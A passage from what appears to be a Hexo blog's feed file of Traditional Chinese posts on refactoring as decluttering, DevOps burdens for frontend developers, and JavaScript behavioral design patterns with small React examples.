class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  &#123; name, level, health, damage &#125;,</span></span><br><span class="line"><span class="params">  &#123; agility, inventory, statusCode &#125;</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">checkNameAndHealth</span>() &amp;&amp; <span class="title function_">checkAgility</span>()) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重複最大的問題是同類型的東西需要修改時，會需要在很多地方修改，但如果程式很少要改，那從這個角度來看好像也沒關係嗎? 那如果是很常需要更改，是不是就容易發生忘記改到的情況?</p><p>重複的東西，是真的相同嗎? 還是只是剛好看起來很像，但滿足的需求不同？</p><p>舉個例子像我就有好多耳機跟運動鞋，學校宿舍用、工作租屋用、辦公室用、運動用、浴室用，但搬回家之後就多了許多沒用到的，如果依照場合去分類就會擁有好幾同類型的物品，整理東西的時候，我們就要先把同一類的東西先集中，這樣才會知道實際上自己擁有了多少。</p><p>有的時候的確是真的相同，牙刷、牙膏來說就是這樣。但以運動用的耳機和浴室用的藍芽喇叭就需要簡易的防水，這就是處理問的問題不太相同，但我們是真的需要嗎?</p><p>整理東西應該是依照物品來做分類和整理，而非依照場所。</p><blockquote><p>整理，是在告訴自己，重要的不是過去的回憶，而是經歷過往後所被成就現在的自己</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>該好好重構和斷捨離的是程式碼還是人生</title>
      <link href="/2023/09/17/simplify-your-life/refactoring-with-pruning/"/>
      <url>/2023/09/17/simplify-your-life/refactoring-with-pruning/</url>
      
        <content type="html"><![CDATA[<h2 id="為什麼需要重構"><a href="#為什麼需要重構" class="headerlink" title="為什麼需要重構"></a>為什麼需要重構</h2><p>在我們的生活中，有許多重要的事情需要我們時常檢討和改進，這個過程被稱為斷捨離，不僅適用於程式碼，也適用於我們的人生。</p><p>在寫許多行程式碼來實現不同的功能，有時候這些程式碼變得非常複雜難以理解，就像一個亂掉的房間一樣，這時候該斷捨離的像是</p><ul><li>寫作文一樣的註解</li><li>需要超級多參數才可以執行的函式</li><li>過度複雜的條件判斷</li><li>寫死的 Magic Number 或是設定檔</li><li>覺得以後有機會用到但現在沒作用的程式碼</li><li>過多的中間產物，更不該把中間產物當結果</li><li>東貼西貼複製貼上的程式碼</li><li>做到一半且短期不會完成的功能</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">10</span> &amp;&amp; (b === <span class="string">&quot;foo&quot;</span> || c &lt; <span class="number">5</span>) &amp;&amp; (d !== <span class="string">&quot;bar&quot;</span> || e &gt; <span class="number">20</span>)) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params">username, email, age, address, phone, interests</span>) &#123;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processALotOfTempValue</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> temp1, temp2, temp3, temp4, temp5, result;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addNumbers</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">  <span class="comment">// 檢查是否為數字</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> num1 !== <span class="string">&quot;number&quot;</span> || <span class="keyword">typeof</span> num2 !== <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;請輸入有效的數字&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 兩個數字相加</span></span><br><span class="line">    <span class="keyword">var</span> result = num1 + num2;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重構是什麼"><a href="#重構是什麼" class="headerlink" title="重構是什麼"></a>重構是什麼</h2><p>程式的斷捨離會是一個重構的過程，重構讓程式碼變得更加簡潔、容易閱讀和維護，就像整理混亂的房間，第一步就是將不必要的部分丟棄，重新組織與排放，使一切井然有序。</p><p>不僅程式碼需要斷捨離，我們的生活也需要，被填滿了的時間表有時候會造成過度壓力，無法應對生活中的挑戰，這也需要人生的斷捨離的時候。</p><p>斷捨離是一個檢討和簡化我們生活的過程，藉由檢討目標和價值觀，看看哪些是真正重要的，哪些是可以放下的。</p><p>以剛剛最後一個例子來說，有看出問題在哪邊嗎?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addNumbers</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">  <span class="comment">// 檢查是否為數字，多餘的程式碼</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> num1 !== <span class="string">&quot;number&quot;</span> || <span class="keyword">typeof</span> num2 !== <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;請輸入有效的數字&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 兩個數字相加</span></span><br><span class="line">    <span class="keyword">var</span> result = num1 + num2;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>該減少的是過多的型別檢查，名稱就是 <code>addNumbers</code> 還傳其他參數進去是天兵? JavaScript 會轉型並不會產生程式錯誤回傳錯誤值跟 <code>請輸入有效的數字</code> 有個 87% 像，else 的 block 是一定會被執行的也不需要多包一層。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addNumbers</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">  <span class="comment">// 兩個數字相加</span></span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管在什麼層面，要避免過度和極端，過度的追求會導致不平衡和不和諧，過多的欲望可能導致內心的不穩定和不滿足，當減少欲望，更可以獲得內在的平靜和滿足感。</p><p>其中有個水的比喻很好，水能夠適應不同的形狀，不爭鬥也不過於強硬，即使不強硬但卻也可以鑿穿石頭。</p><h2 id="YAGNI-You-aren’t-gonna-need-it"><a href="#YAGNI-You-aren’t-gonna-need-it" class="headerlink" title="YAGNI (You aren’t gonna need it!)"></a>YAGNI (You aren’t gonna need it!)</h2><p>YAGNI（You Aren’t Gonna Need It）是一個在軟體開發中的設計原則，它強調在開發過程中不要添加不必要的功能或程式碼。</p><p>對於人生來說，我們在同個時間只需要一條牙膏跟一隻牙刷，如果依照每層樓去擺放一樣的物品一個家裡面就會擁有好幾組，但我們其實只需要一組不是嗎?</p><p>整理東西的時候，我們就要先把同一類的東西先集中，就像我就有好多無線耳機跟喇叭，學校宿舍、工作租屋、辦公室、浴室、運動，但搬回家之後就多了許多沒用到的。</p><p>從《道德經》的觀點來看，YAGNI 可以被解釋為一個實踐節制和簡單的原則，符合道教哲學中強調的中庸之道和適度的概念。</p><p>YAGNI 提醒我們不要過於追求完美或添加過多的物品，而應該保持簡單和精簡，並且適時去反省只關注當下需求好好解決即可，不需要為了未來的可能增加多餘的東西。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可以簡單就不要複雜的程式碼與人生</title>
      <link href="/2023/09/16/simplify-your-life/keep-both-code-and-life-simple-when-possible/"/>
      <url>/2023/09/16/simplify-your-life/keep-both-code-and-life-simple-when-possible/</url>
      
        <content type="html"><![CDATA[<p>開始之前，先來談談工程師的日常</p><ul><li>程式碼因為需求一直亂加，本來的水果刀被改成瑞士刀。</li><li>傳承的祖產本體難以更動，導致疊床架屋違建加蓋再加蓋，一個判斷不夠那就補兩個湊一對</li><li>這個需求很簡單，明天可以給一版嗎? 一天有一天的品質一周也有一周的品質</li></ul><p>不知道大家有沒有一個體會，總是覺得為什麼再怎麼整理都整理不好? 不管是程式碼、房間或是人生。</p><p>回到實際一點的例子，時間有限且空間就是這麼大，但東西卻越來越多，越是追求收納反而越容易堆滿東西。</p><p>資本主義的社會明明是有限的資源中卻想要追求無限的可能，握緊拳頭的時候沒有任何的空間，當然也就沒辦法再拿起什麼，於是我們開始學會放手，哀悼和告別舊的自己與關係，才繼續走向新的地方。</p><blockquote><p>如同萬物，有開始，也會結束。</p></blockquote><p>有無相生是道教哲學的一個重要概念，要先有空間，才會有機會存在與擁有。</p><p>有與無是相對的，一個概念需要存在，才能有相對的概念，就像是有光也才能有影子，當現在期待著不同的未來，那我們就要學會捨棄一些東西，先讓現在成為無的狀態在未來也才會存在有。</p><p>在網路業中，當明確的商業目標和好的規格文件出現後才會有程式碼，但沒有程式碼也沒有辦法達成商業目標，這就是有無相生的體現，有無相生鼓勵我們追求平衡與和諧，過分強調某一方面就像握緊的雙手可能最後什麼都抓不到。</p><p>優化程式開發流程時，過於追求完美或過度工程化可能會導致浪費時間和資源，也該同時關注實際商業需求並學習在追求效率和品質之間取得平衡，在寫程式的世界中，該拋棄的是不必要的複雜結構。</p><p>在生活中，是放下無謂的擔憂和煩惱，追求快樂和內心的平靜，追求完美，但卻時常忘記了生活的美好。</p><p>這就是為什麼我們需要一種魔法，一種斷捨離的魔法。</p><p>斷捨離的過程中，要判斷的就是這些東西是不是真的需要是否要丟掉，以及決定物品的定位才會整齊和方便尋找。</p><p>程式碼也是一樣，究竟那些傳承祖產是不是該留著? 先進行全域搜尋確定原本到底有多少類似的情境，才進行整理和重構，只留下真的有需要的，剩下通通都刪掉。</p><p>有人可以說出什麼是無瑕的程式碼嗎? 對我來說那就是一行程式都沒有寫的程式碼，沒有寫 code 也就不會有 bug。</p><p>在程式碼、生活中的斷捨離，我們該學會不陷入無休止的深思熟慮，不被工作壓垮，盡可能可以在每一天結束時提前下班，享受更多時間來探索這個精彩的世界。</p><p>這 30 天，期許自己每天花三分鐘的時間練習斷捨離，目標是透過架構、設計模式、重構的方法論來達到提高開發效率、減少維護上的混亂、更好的專注力、更好的生活品質，也就是學會更快下班的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DevOps X 被趕鴨子的前端工程師</title>
      <link href="/2023/07/31/experience-sharing-devops/"/>
      <url>/2023/07/31/experience-sharing-devops/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-DevOps"><a href="#什麼是-DevOps" class="headerlink" title="什麼是 DevOps?"></a>什麼是 DevOps?</h2><p>DevOps 是 Development 和 Operations 何在一起的縮寫，目的是做到誰開發建構就由誰部屬和執行，把 Development 和 Operations 交給同樣一批人來處理，意味著開發人員也開始要協助進行傳統 SRE 所做的工作。</p><h2 id="DevOps-體驗"><a href="#DevOps-體驗" class="headerlink" title="DevOps 體驗"></a>DevOps 體驗</h2><p>近年來雲端運算由於快速的增長，DevOps 和雲原生的概念興起，所以不得不將多集群的微服務部屬到多個環境中。</p><p>工程師們突然被迫需要懂 N 種工具像是 K8s、Helm Chart、GitOps、Argo CD、Lens、Ansible、Terraform、Prometheus、Grafana、ELK 等等，而需要理解這些工具的目的只是為了部署和測試一個簡單程式碼更動。</p><p>本來由 SRE 所做的工作一夕之間全部被交給開發團隊，所以一整天的日常就會變成</p><ol><li>進 Code 發 PR 等 CI</li><li>CI 完成後執行 CD 的工具</li><li>透過工具觀察 K8s 上面的 Pod 是不是真的有如期長出來</li><li>Pod 長出來後看看有沒有任何執行錯誤</li><li>確認長出來的 Pod 在跨不同群集之間的網路有沒有問題</li><li>透過監控工具來持續觀察是否有不正常的情況發生</li></ol><p>可是等等，我們本來的應徵的工作範圍不是只有開發而已嗎? 怎麼又變成身兼 MIS 設定網路還有順便當個 SRE 在那邊維運了呢?</p><h2 id="DevOps-心得與想法"><a href="#DevOps-心得與想法" class="headerlink" title="DevOps 心得與想法"></a>DevOps 心得與想法</h2><p>在其他領域各行業幾乎都走專業分工，但在 IT 領域卻鼓勵<strong>誰建構就由誰執行</strong>，把 Development 和 Operations 交給同樣一批人來處理，開發人員被要求 End to End 的去部屬和運行應用。</p><p>理想上對 FANNG 等級的組織來說 DevOps 肯定很棒很有效，因為工程師們都非常優秀且會為了改善流程不斷努力。</p><p>但! 對於大多數團隊而言，其實問題重重。畢竟大多數公司都沒有那樣等級的員工，要實際執行 DevOps 並不簡單，畢竟大多日常的工作都做不完了，又怎麼會為了優化開發工作流程和體驗而投入資源?</p><p>取而代之的會是</p><ul><li><strong>CD 怎麼按了沒反應</strong></li><li><strong>那個爛章魚怎麼一直轉</strong></li><li><strong>Pod 怎麼起來之後一直噴錯</strong></li><li><strong>打其他 Service 怎麼沒通</strong></li><li><strong>怎麼 Pod 掛掉之後再起不能</strong></li></ul><p>然後很可能什麼事都還沒做到，重複那些 1-6 一整天就這麼結束了。小編認為大部分的工程師比較理想的情況需要的是使用現有的平台服務，將平台所需相關的專業工作交還給平台。</p><blockquote><p><strong>平台將所有操作都轉化成一致的服務體驗，讓每個人不用再了解整個工具鏈並且熟悉所有操作</strong></p></blockquote><p>如果是身為一個前端應用的開發者，如果使用平台服務我們就不需要考慮其他領域的複雜的問題:</p><ul><li>資料庫有沒有規劃讀寫分離，效能會不會隨著使用者增多而下降?</li><li>跨系統之間資料該怎麼整合和安全性該怎麼處理?</li></ul><p>DevOps 是一種理念，平台服務 (PAAS) 其實就是一個實踐 DevOps 平台，目的就是對運維細節進行封裝。</p><p>現在主流雲端服務廠商也都有提供，舉例來說像是 Google 的 Firebase 或是 AWS CDK 就是將 Best Practice 封裝好，讓開發工程師們不用了解太多的底層實現，就可以直接從運維或需求進行操作。</p>]]></content>
      
      
      <categories>
          
          <category> 軟體工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Behavioral Pattern</title>
      <link href="/2023/06/30/js-pattern/js-behavioral-pattern/"/>
      <url>/2023/06/30/js-pattern/js-behavioral-pattern/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會介紹 JavaScript 的 Behavioral Patterns，行為模式是一種設計模式，它關注的是專注在物件之間的溝通。</p><p>行為模式組織物件之間的關係，提高可讀性和可維護性，下面是幾個常見的 JavaScript 行為模式:</p><ul><li>Strategy Pattern (策略模式): 考前可以選擇不同的學習策略來應考，可以根據不同的情況選擇不同的解決方法。</li><li>Iterator Pattern (迭代器模式): 讀書時依序讀不同章節一樣，在程式中可以逐步訪問集合中的每個元素。</li><li>State Pattern (狀態模式): 根據天氣的不同，穿著不同的衣服，狀態模式根據不同的狀態改變自己的行為。</li><li>Command Pattern (命令模式): 可以把每個操作想像成一個命令，每個命令都有特定的任務或功能，並且可以被執行。</li><li>Observer Pattern (觀察者模式): 就像你訂閱你喜歡的 YouTuber 一樣，當有新的影片時會收到通知，建立訂閱和通知的機制。</li></ul><p>Design Patterns 依照目的分成三群：</p><ul><li><a href="https://linyencheng.github.io/2023/02/25/js-pattern/js-creational-pattern/">Creational Patterns 創建型</a></li><li>Structural Patterns 結構型，結構型設計模式根據實際情況會分成三種:<ul><li><a href="https://linyencheng.github.io/2023/03/29/js-pattern/js-structure-pattern-for-programming-syntax/">優化語法</a></li><li><a href="https://linyencheng.github.io/2023/04/02/js-pattern/js-structure-pattern-for-code/">優化程式碼結構</a></li><li><a href="https://linyencheng.github.io/2023/05/30/js-pattern/js-structure-pattern-for-project/">優化專案結構</a></li></ul></li><li><a href="https://linyencheng.github.io/2023/06/30/js-pattern/js-behavioral-pattern/">Behavioural Patterns 行為型</a></li></ul><h2 id="Strategy-Pattern-策略模式"><a href="#Strategy-Pattern-策略模式" class="headerlink" title="Strategy Pattern (策略模式)"></a>Strategy Pattern (策略模式)</h2><p>策略模式用於在元件間共享行為和邏輯，目的是將可互換的行為封裝成獨立的策略物件，在運行時動態選擇適當的策略來執行特定的任務。</p><p>可以幫助實現元件的</p><ul><li>去耦合</li><li>可重用性</li><li>可擴展性</li></ul><p>在 React 中，策略模式可以應用於元件的行為和邏輯。</p><ol><li>策略元件: StrategyA 和 StrategyB，這兩個元件分別實現了不同的行為<ul><li>策略是 ‘A’ -&gt; 渲染 StrategyA</li><li>策略是 ‘B’ -&gt; 渲染 StrategyB</li></ul></li><li>ContextComponent 是上下文元件，根據傳遞的策略選擇渲染相應的策略元件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 策略元件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">StrategyA</span> = (<span class="params">&#123; data &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 策略 A 的實現</span></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Strategy A: &#123;data&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">StrategyB</span> = (<span class="params">&#123; data &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 策略 B 的實現</span></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Strategy B: &#123;data&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上下文元件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ContextComponent</span> = (<span class="params">&#123; strategy, data &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 根據選擇的策略渲染對應的元件</span></span><br><span class="line">  <span class="keyword">if</span> (strategy === <span class="string">&quot;A&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StrategyA</span> <span class="attr">data</span>=<span class="string">&#123;data&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strategy === <span class="string">&quot;B&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StrategyB</span> <span class="attr">data</span>=<span class="string">&#123;data&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> strategy = <span class="string">&quot;A&quot;</span>; <span class="comment">// 選擇策略 A 或 B</span></span><br><span class="line">  <span class="keyword">const</span> data = <span class="string">&quot;Hello, Strategy Pattern!&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">ContextComponent</span> <span class="attr">strategy</span>=<span class="string">&#123;strategy&#125;</span> <span class="attr">data</span>=<span class="string">&#123;data&#125;</span> /&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Inversion-of-Control-控制反轉"><a href="#Inversion-of-Control-控制反轉" class="headerlink" title="Inversion of Control (控制反轉)"></a>Inversion of Control (控制反轉)</h3><p>控制反轉是一種軟體設計原則，它提倡將控制權交給框架或容器，由它們來管理對象的建立和依賴關係。這種模式可以幫助實現代碼的鬆耦合和可測試性。</p><p>原本的元件可以想像是一台車子，要控制車子就必須坐進去車子中，控制反轉是將車子設計成遙控車的概念，透過介面來進行控制。</p><p>底下舉兩個簡單的例子，透過把 <code>normalize</code> 的控制權放到 props 就能夠動態的去改動 input 文字大小寫。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Input</span> = (<span class="params">&#123; normalize &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">value</span>=<span class="string">&#123;text&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">onChange</span>=<span class="string">&#123;(&#123;</span> <span class="attr">target</span> &#125;) =&gt;</span> setValue(normalize(target.value))&#125;</span></span><br><span class="line"><span class="language-xml">    /&gt;</span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">normalize</span>=<span class="string">&#123;(text)</span> =&gt;</span> text.toUpperCase()&#125; /&gt;</span>;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">normalize</span>=<span class="string">&#123;(text)</span> =&gt;</span> text.toLowerCase()&#125; /&gt;</span>;</span><br></pre></td></tr></table></figure><h2 id="Iterator-Pattern-迭代器模式"><a href="#Iterator-Pattern-迭代器模式" class="headerlink" title="Iterator Pattern (迭代器模式)"></a>Iterator Pattern (迭代器模式)</h2><p>Iterator Pattern 目的是將遍歷集合的邏輯從集合本身分離出來，使得遍歷操作與集合的實現相互獨立，可以簡單地更換遍歷方式或使用不同的迭代器來遍歷不同類型的集合。</p><p>在程式中不會再出現傳統的 <code>for</code> 跟 <code>while</code>，提供了統一的方式來遍歷不同類型的集合提高可讀性和可維護性。</p><p>React 的迭代器模式範例:</p><ol><li>ListComponent 接受 items 屬性後使用 map 函數來遍歷 items。</li><li>IteratorComponent 透過 <code>iterable[Symbol.iterator]()</code> 方法取到物件迭代器，將迭代器轉換為陣列並使用 map 函數遍歷每個元素。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 列表元件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ListComponent</span> = (<span class="params">&#123; items &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;items.map((item) =&gt; (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span>&gt;</span>&#123;item.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      ))&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍歷器元件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">IteratorComponent</span> = (<span class="params">&#123; iterable &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> iterator = iterable[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Iterator Component<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;Array.from(iterator).map((item) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span>&gt;</span>&#123;item.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> items = [</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;Item 1&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&quot;Item 2&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&quot;Item 3&quot;</span> &#125;,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span 